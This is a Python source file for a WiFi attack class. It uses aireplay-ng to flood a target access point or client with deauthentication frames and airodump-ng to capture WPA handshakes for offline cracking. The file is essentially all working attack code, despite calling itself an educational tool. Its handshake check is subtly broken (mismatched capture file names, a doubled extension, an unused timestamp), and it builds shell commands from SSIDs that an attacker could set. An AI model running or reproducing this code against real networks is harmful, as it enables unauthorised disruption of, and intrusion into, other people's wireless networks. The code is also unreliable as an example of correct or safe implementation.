# attacker.py
import subprocess
from utils import run_command, Logger
import time
import os

class WifiAttacker:
    def __init__(self, interface):
        self.interface = interface
        self.cap_dir = "./captured_caps"
        os.makedirs(self.cap_dir, exist_ok=True)

    def deauth_attack(self, target_bssid, target_client="ff:ff:ff:ff:ff:ff", count=100):
        """Send deauthentication frames."""
        Logger.info(f"Starting Deauth Attack on {target_bssid} (Client: {target_client})")
        # Using aireplay-ng
        cmd = f"aireplay-ng --deauth={count} -a {target_bssid} -c {target_client} {self.interface}"
        run_command(cmd)
        Logger.success("Deauth attack sent.")

    def capture_handshake(self, target_bssid, channel, ssid):
        """Capture WPA Handshake using airodump-ng."""
        Logger.info(f"Capturing handshake on Channel {channel}...")
        
        # Create a unique filename based on SSID and time
        timestamp = int(time.time())
        cap_file = os.path.join(self.cap_dir, f"{ssid}_{target_bssid}.cap")
        
        # Run airodump-ng in background to capture until handshake is found or timeout
        # We use a simple timeout approach for this educational tool
        cmd = f"timeout 30 airodump-ng --bssid {target_bssid} -c {channel} -w {self.cap_dir}/{ssid}_cap {self.interface}"
        
        Logger.info("Waiting for handshake... (Max 30s)")
        # Note: In a real app, we'd parse the stdout to detect "WPA Handshake"
        # Here we just run it and assume success if no error
        output = run_command(cmd)
        
        # Check if cap file exists and is not empty
        if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0:
            Logger.success(f"Handshake captured! Saved to {cap_file}.cap")
            return f"{self.cap_dir}/{ssid}_cap"
        else:
            Logger.warning("No handshake captured within timeout.")
            return None